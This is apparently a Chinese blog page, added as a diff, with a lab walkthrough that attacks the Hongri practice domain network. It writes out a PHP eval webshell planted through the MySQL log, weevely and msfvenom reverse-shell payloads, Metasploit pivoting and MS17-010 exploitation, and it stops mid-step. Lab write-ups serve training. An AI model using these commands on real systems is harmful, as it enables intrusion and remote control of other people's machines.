@@ -1,0 +1,985 @@
+<!--
+	作者：Sariay
+	时间：2018-08-26
+	描述：There may be a bug, but don't worry, Qiling(器灵) says that it can work normally! aha!
+-->
+<!DOCTYPE html>
+<html class="html-loading">
+		
+
+<head>
+	<meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <title>
+    
+       | Hexo
+    
+  </title>
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="" />
+  <meta name="description" content="" />
+	<!-- favicon -->
+  <link rel="shortcut icon" href="/img/favicon.ico">
+
+  <!-- css -->
+  
+<link rel="stylesheet" href="/css/Annie.css">
+
+  
+  <!-- jquery -->
+	
+<script src="/plugin/jquery/jquery.min.js"></script>
+
+
+<script>
+    const CONFIG_BGIMAGE = {
+      mode: 'normal',
+      normalSrc: '/img/header-bg.jpg',
+      randomYouMax: 110,
+      randomYouSrc: 'https://sariay.github.io/Random-img/',
+	  randomOtherSrc: 'https://api.berryapi.net/?service=App.Bing.Images&day=-0',
+	  preloaderEnable: true
+    }
+	
+    const CONFIG_LEACLOUD_COUNT = {
+      enable: false,
+	  appId: 'AU8...',
+	  appKey: '4cU...',
+	  serverURLs: 'http' || ' '
+    }
+  </script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+	<body>
+		<!-- Preloader -->
+
+	<div id="preloader">
+		<div class="pre-container">
+			
+				<div class="spinner">
+					<div class="double-bounce1"></div>
+					<div class="double-bounce2"></div>
+				</div>
+						
+		</div>
+	</div>
+
+
+<!-- header -->
+<header class="fixbackground bg-pan-br">
+	<div class="mask">
+		<!-- motto -->
+		<div class="h-body">	
+			
+				<div class="motto text-shadow-pop-left">
+					<p class="content" id="motto-content">获取中...</p>
+					<p>-<p>
+					<p class="author" id="motto-author">Just a minute...</p>
+				</div>
+			
+		</div>
+		
+		<!-- others: such as time... -->			
+		<div class="h-footer">
+			<a href="javascript:;" id="read-more" class="scroll-down">
+				<span class="icon-anchor1 animation-scroll-down"></span>
+			</a>
+		</div>
+	</div>
+</header>
+
+<div id="navigation-hide">
+	<!-- Progress bar -->
+	<div id="progress-bar"></div>
+
+	<!-- Progress percent -->
+	<div id="progress-percentage"><span>0.0%</span></div>
+
+	<div class="toc-switch"><span class="switch-button">目录</span></div>
+
+	<!-- Page title -->
+	<p>
+		
+			「」
+		
+	</p>
+
+	
+	
+
+	<!-- Nav trigger for navigation-H-->
+	<a class="nav-trigger"><span></span></a>
+</div>
+
+<!-- Navigation in div(id="navigation-H") -->
+<nav class="nav-container" id="cd-nav">
+	<div class="nav-header">
+		<span class="logo"> 
+			<img src="/img/logo.png">
+		</span>
+		<a href="javascript:;" class="nav-close"></a>
+	</div>
+	
+	<div class="nav-body">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about" target="_blank">关于</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+</ul>
+	</div>
+	
+	<div class="nav-footer">
+		<ul id="global-social">
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-one"><span class="path1"></span><span class="path2"></span></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-zhihu"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-github"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-sina-weibo "></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-pinterest2"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-instagram"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-twitter"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="/atom.xml" target="_blank">
+				<span class="icon-rss"></span>
+			</a>
+		</li>
+			
+</ul>
+
+	</div>
+</nav>
+			
+		<!--main-->
+		<main>
+			<!--
+	时间：2018-11-17
+	描述：
+		插件名称：katelog.min.js
+		插件作者：KELEN
+		插件来源: https://github.com/KELEN/katelog
+-->
+
+	
+		<div class="layout-toc">
+			<div id="layout-toc">
+				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
+			</div>
+		</div>
+
+		
+<script src="/plugin/toc/katelog.min.js"></script>
+
+
+		
+	 
+
+<div class="layout-post">
+	<div id="layout-post">
+		<div class="article-title">
+			
+		</div>
+
+		<div class="article-meta">
+			<span>
+				<i class="icon-calendar1"></i>
+				
+				
+
+
+
+
+	更新于
+
+	<a href="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url">
+		<time datetime="2021-10-22T10:24:15.590Z" itemprop="dateUpdated">
+	  		2021-08-16
+	  </time>
+	</a> 
+
+
+
+			</span>
+			<span>
+						
+			</span>
+			
+			
+
+
+
+		</div>
+
+		<div class="article-content" id="article-content">
+			<h1 id="红日靶场内网渗透"><a href="#红日靶场内网渗透" class="headerlink" title="红日靶场内网渗透"></a>红日靶场内网渗透</h1><h2 id="渗透环境"><a href="#渗透环境" class="headerlink" title="渗透环境"></a>渗透环境</h2><p>外网攻击主机:  kali         </p>
+<p>172.16.243.128</p>
+<p>内网中的web服务器:   win7      </p>
+<p>公网ip:   172.16.243.130</p>
+<p> 私网ip:   192.168.52.140</p>
+<p>​      </p>
+<p>内网中的域成员主机:   win2003</p>
+<p>  192.168.52.141</p>
+<p>内网中的域控主机:     win2008</p>
+<p>  192.168.52.138</p>
+<p>kali作为攻击主机，win7作为web服务器防止两个网卡，能连接内网，web服务被外网所访问</p>
+<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><h3 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h3><p>首先确定攻击网卡</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ettercap -I</span><br><span class="line">或者 ifconfig </span><br></pre></td></tr></table></figure>
+
+<p>可以看到下面的kali的两个网卡，这里使用的是eth0网卡</p>
+<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805200341062.png" alt="image-20210805200341062"></p>
+<p>使用arp-scan对主机使用网卡的局域网内的主机进行扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -interface=eth0 --localnet</span><br></pre></td></tr></table></figure>
+
+<p>可以看到eth0局域网中的存活主机，这里可以看到内网中开放的web服务器主机为172.16.243.130</p>
+<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805201058838.png" alt="image-20210805201058838"></p>
+<p>下面对目标web服务器进行信息收集，比如端口，操作系统等信息</p>
+<p>使用nmap进行端口扫描和目标系统探测</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">namp -sV -A 172.16.243.130</span><br><span class="line">-sV   扫描目标主机运行软件的版本</span><br><span class="line">-A    扫描目标主机的操作系统和版本检测，脚本扫描和路由跟踪等</span><br></pre></td></tr></table></figure>
+
+<p>可以看到扫描出来的结果，目标主机开放80和3306端口,目标主机开放的两个端口都有可利用价值，对于3306端口的mysql服务，我们可以尝试暴力破解其用户名和密码</p>
+<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805201824989.png" alt="image-20210805201824989"></p>
+<p>访问目标主机的web服务,可以看到目标服务器phpstudy的web探针和php版本信息</p>
+<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805202527075.png" alt="image-20210805202527075"></p>
+<p>对于web探针页面，我们可以看到很多信息，服务器系统版本，web中间件的版本，主机名，管理员邮箱和web绝对根目录等敏感信息</p>
+<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805202702697.png" alt="image-20210805202702697"></p>
+<p>使用dirsearch和dirmap等工具对服务器进行目录扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u &quot;http://172.16.243.130&quot; -e</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>服务器目录如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">phpmyadmin     ##mysql数据库管理工具</span><br><span class="line"></span><br><span class="line">phpinfo.php     ##php版本信息</span><br><span class="line"></span><br><span class="line">1.php               </span><br><span class="line"></span><br><span class="line">beifen.rar</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="拿取目标主机shell权限"><a href="#拿取目标主机shell权限" class="headerlink" title="拿取目标主机shell权限"></a>拿取目标主机shell权限</h3><p>1.由于目标服务器存在phpmyadmin，我们访问该数据库管理后台，尝试弱口令，暴力破解等</p>
+<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805210542586.png" alt="image-20210805210542586"></p>
+<p>这里使用弱口令root  root登录了后台</p>
+<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805210815913.png" alt="image-20210805210815913"></p>
+<p>可以看到目标服务器中的数据库列表如下，值得注意的是mysql数据库中的user数据表和newyxcms数据库(这个可能是旁站cms的数据库)</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806111233382.png" alt="image-20210806111233382"></p>
+<p>进入后台我们想拿到服务器shell权限，由于在之前信息收集中知道了绝对路径，所以尝试使用sql语句写入一句话木马，然后使用工具连接，拿到服务器shell权限</p>
+<p>在SQL窗口执行写入一句话木马SQL语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_GET[&quot;cmd&quot;]);?&gt;&#x27; into outfile &#x27;C:/phpstudy/www/cmd.php&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>但提示由于设置了secure_file_priv选项限制了文件的写入</p>
+<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805211802360.png" alt="image-20210805211802360"></p>
+<p>我们来看看secure_file_priv这个参数的设置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW GLOBAL VARIABLES LIKE &#x27;%secure%&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到该参数设置为NULL，表示限制啦mysql不允许导入导出，写入文件</p>
+<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805213119488.png" alt="image-20210805213119488"></p>
+<p>我们换个思路，对于数据库的日志记录，尝试修改日志文件为php后缀指定文件，然后将一句话木马写入该日志记录文件中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=&#x27;on&#x27;;      ##开启日志记录</span><br><span class="line">set global general_log_file=&#x27;C:/phpstudy/WWW/eval.php&#x27;;      ##指定日志记录文件位置为根目录下</span><br><span class="line">select &#x27;&lt;?php @eval($_GET[&quot;cmd&quot;]); ?&gt;&#x27;;                    ##输入查询一句话语句，日志记录开启记录在指定文件中</span><br></pre></td></tr></table></figure>
+
+
+
+<p>访问172.16.243.130/eval.php,可以看到写入eval.php成功</p>
+<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805215930898.png" alt="image-20210805215930898"></p>
+<p>2.在之前对目标网站的目录进行扫描时，发现个压缩包叫做beifen.rar，下载后解压发现为yxcms文件夹，判断目标网站存在旁站，目标服务器部署了一个网站</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806111905032.png" alt="image-20210806111905032"></p>
+<p>在网上搜索了一下，发现yxcms是一个企业化的建站系统,YXcms是一款基于PHP+MySql开发的网站管理系统，采用轻量级[MVC设计模式]。</p>
+<p>其默认的后台页面为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://域名或ip/yxcms/index.php?r=admin</span><br></pre></td></tr></table></figure>
+
+
+
+<p>构造url访问该网站页面:<a target="_blank" rel="noopener" href="http://172.16.243.130/yscms">http://172.16.243.130/yscms</a></p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806113506787.png" alt="image-20210806113506787"></p>
+<p>浏览了一下主页面，出来有个cms后台登录页面看起来有点意思，其余的没什么好东西，于是点击登录，尝试弱口令登录后台</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806113733048.png" alt="image-20210806113733048"></p>
+<p>结果显示登录失败</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806113851326.png" alt="image-20210806113851326"></p>
+<p>我看了看url中的r参数为member，是否通过r参数来判断一般用户和管理员登录权限，于是将r修改成admin尝试访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.243.130/yxcms/index.php?r=admin</span><br></pre></td></tr></table></figure>
+
+<p>可以看到yxcms的管理后台，尝试使用弱口令admin 123456进行登录</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806114049007.png" alt="image-20210806114049007"></p>
+<p>成功登录后台页面，可以看到很多服务器相关信息和yxcms网站相关设置和功能</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806115148987.png" alt="image-20210806115148987"></p>
+<p>在全局设置中的前台模板中，我们可以修改模板文件，我们可以将木马代码插入其中并进行加载</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806141921572.png" alt="image-20210806141921572"></p>
+<p>通过上述的一些方法将一句话木马上传到目标web服务器中，然后使用webshell工具去连接目标路径的木马，拿到web服务器的shell和权限</p>
+<p>使用weevely生成木马文件test.php,并将其上传到目标web服务器上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely generate password(密码)  test.php(生成文件名)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806144420340.png" alt="image-20210806144420340"></p>
+<p>然后去连接服务器上的test.php文件，连接建立会话成功</p>
+<p>weevely  <a target="_blank" rel="noopener" href="http://172.16.243.130/test.php(%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84)">http://172.16.243.130/test.php(文件路径)</a>  password(密码)</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806144559145.png" alt="image-20210806144559145"></p>
+<p>接下来我们在攻击主机上利用msfvenom生成反弹shell的木马qq.exe</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.243.128 lport=12345 -f exe &gt; qq.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806151838583.png" alt="image-20210806151838583"></p>
+<p>然后我们将qq.exe通过weevely上传到目标服务器目录中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_upload /opt/tools/web/auto/metasploit/qq.exe qq.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<p>运行该木马程序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell_sh qq.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<p>接着打开msfconsole，开启监听模块设置参数反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole         ###打开metasploit</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler   ###设置监听模块</span><br><span class="line"></span><br><span class="line">set lhost 172.16.243.1      ##设置监听主机ip地址</span><br><span class="line"> </span><br><span class="line">set lport 12345              ###设置监听主机端口</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806153849245.png" alt="image-20210806153849245"></p>
+<p>可以看到反弹shell成功，通道建立成功</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806200708273.png" alt="image-20210806200708273"></p>
+<h3 id="目标主机信息收集"><a href="#目标主机信息收集" class="headerlink" title="目标主机信息收集"></a>目标主机信息收集</h3><p>后渗透阶段先不急着立马提权或者进行横向渗透，先对目标主机以及所在环境进行全方位的信息收集</p>
+<p>主机信息收集的常用cmd命令:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">systeminfo                  #查看详细的系统信息</span><br><span class="line">whoami                      #查看当前使用用户</span><br><span class="line">hostname                    #主机名称</span><br><span class="line">net user                    #查看主机上的用户</span><br><span class="line">net localgroup administrators     #查看系统管理员组中的用户列表</span><br><span class="line">ipconfig /all              #查看主机网络配置情况</span><br><span class="line">net share                  #查看本地开启的共享的文件夹</span><br><span class="line">netstat -ano | findstr &quot;端口号&quot;   #查看指定端口的开放情况</span><br><span class="line">wmic product  get name,version   #查询已安装的软件名称及版本情况</span><br><span class="line">cmdkey  /list              #查看3389远程端口可信任链接</span><br><span class="line">FOR /f &quot;skip=1 token=1,2 delims= &quot; %c in (&#x27;wmic useraccount get name^,sid&#x27;) do dir /a /b C:\$Recycle.Bin\%d\ ^&gt;%c.txt  #windows回收站的信息获取</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>使用systeminfo查看目标主机的系统信息</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806203335970.png" alt="image-20210806203335970"></p>
+<p>可以看到主机的安装的修补程序，这也是需要着重观察的信息，我们可以通过该修补程序中没有的补丁来查看主机漏洞进行攻击</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806203504328.png" alt="image-20210806203504328"></p>
+<p>可以看到拿到目标主机的权限是管理员权限</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806204341557.png" alt="image-20210806204341557"></p>
+<h3 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h3><p>常用的域信息收集命令:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">net view /domain          #查看域</span><br><span class="line">net group /domain         #查询组</span><br><span class="line">net user  /domain         #查询域用户</span><br><span class="line">net group  &quot;domain admin&quot;  /domain     #查询域管理员信息</span><br><span class="line">net group  &quot;domain computers&quot;  /domain   #查询域内机器信息</span><br><span class="line">net config workstation        #查看当前计算机名，全名，用户名等信息</span><br><span class="line">net time  /domain             #查询主域服务器的时间</span><br></pre></td></tr></table></figure>
+
+<p>上述的命令会发送到域控中查询信息，如果渗透的机器不是与用户则不是域用户权限，但是存在域</p>
+<p>下面为当前计算机的相关信息，可以看到指定的域dns名称为god.org</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806211120373.png" alt="image-20210806211120373"></p>
+<p>一般来说，域主机的DNS服务器指定的是域控的ip地址，我们可以使用nslookup来观察dns服务器ip地址和解析god.org的A记录ip地址。可以看到ip地址都为192.168.52.138,则可以判断域控为它</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806211603738.png" alt="image-20210806211603738"></p>
+<h3 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h3><p>这里由于反弹shell后连接的目标主机权限为管理员权限，也就省去了提权的操作。收集完目标主机的相关信息后，下面就是对处于内网的主机进行横向渗透，先对域内的主机进行渗透，然后在对域控进行渗透</p>
+<h4 id="路由-端口转发"><a href="#路由-端口转发" class="headerlink" title="路由/端口转发"></a>路由/端口转发</h4><p>要想在处于外网的攻击主机连接处于内网域中的主机，肯定是不能直接连接的，要通过受控主机进行端口转发或者路由转发，使受控主机充当个路由转发使外网的主机能连接处于内网的主机</p>
+<p><strong>1.直接利用msf添加到内网网段的路由</strong></p>
+<p>msf路由相关命令:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run get_local_subnets            #查看本机的路由</span><br><span class="line">run autoroute  -s  192.168.52.0/24  #添加目标内网网段到路由信息中</span><br><span class="line">run autoroute  -p               #查看当前的路由设置</span><br></pre></td></tr></table></figure>
+
+<p>可以看到当前的路由设置为到内网网段，现在就可以通过msf访问内网主机</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806212949813.png" alt="image-20210806212949813"></p>
+<p><strong>2.将内网穿透工具上传到web服务器上，然后在攻击机上进行连接指定端口</strong></p>
+<p>这里使用venom工具进行内网穿透，将agent.exe使用upload命令上传到目标web服务器上，然后在攻击机上运行admin客户端程序</p>
+<p>这里使用反向代理，客户端监听4444端口，让服务端来连接客户端(admin和agent都可以进行监听和连接)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./admin_linux_x64 -lport 4444</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210808182501466.png" alt="image-20210808182501466"></p>
+<p>在目标主机上运行agent.exe指定admin的ip地址和端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">agent.exe -rhost 172.16.243.1  -rport 4444</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h4><p>下面就是对目标内网进行信息收集</p>
+<p>探测内网中的存活主机，有那些域主机和域控主机</p>
+<p>这里使用的是metasploit的auxiliary/scanner/portscan模块进行端口信息的收集，在之前的信息收集中可以发现域内出来138这台域控外还有一台域内主机，我们首先对这台域内主机进行渗透</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auiliary/scanner/portscan</span><br><span class="line">set rhost 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以看到该台域内主机的端口开放如下:</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210808214717299.png" alt="image-20210808214717299"></p>
+<p>对域控主机182.168.52.138进行端口扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auiliary/scanner/portscan</span><br><span class="line">set rhost 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210810112439456.png" alt="image-20210810112439456"></p>
+<h4 id="域内主机渗透"><a href="#域内主机渗透" class="headerlink" title="域内主机渗透"></a>域内主机渗透</h4><h4 id="漏洞检测利用"><a href="#漏洞检测利用" class="headerlink" title="漏洞检测利用"></a>漏洞检测利用</h4><p>目标端口的139和445端口开放，联想到ms17-010这个漏洞，尝试去验证这个漏洞是否存在</p>
+<p>首先使用nmap自带的脚本进行漏洞Fuzz：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln  192.168.52.141</span><br></pre></td></tr></table></figure>
+
+<p>这里的nmap扫描并没有成功</p>
+<p>尝试使用/scanner/smb/ms17_010_commmand模块对目标进行扫描,发现目标可能存在ms17_010</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use  auxiliary/scanner/smb/smb_ms17has</span><br><span class="line">set rhosts 192.168.52.141</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210808220259617.png" alt="image-20210808220259617"></p>
+<p>下面使用admin/smb/ms17_010_command模块对该主机的ms17_010判断是否为可以利用和执行的权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use  admin/smb/ms17_010_command</span><br></pre></td></tr></table></figure>
+
+<p>可以看到目标主机执行的权限为Administrator管理员权限</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210808221620326.png" alt="image-20210808221620326"></p>
+<p>接下来就是对目标主机的ms17-010进行漏洞利用拿到目标shell</p>
+<p>我首先使用的是exploit/windows/smb/ms17_010_eternablue模块的windows/x64/meterpreter/reverse_tcp的payload，但是管道并没有创建成功，由于目标内网不能连接攻击主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_enternablue</span><br><span class="line"></span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809104223573.png" alt="image-20210809104223573"></p>
+<p>接着使用了windows/smb/ms17_010_pspexec模块的windows/shell/bind_tcp的payload</p>
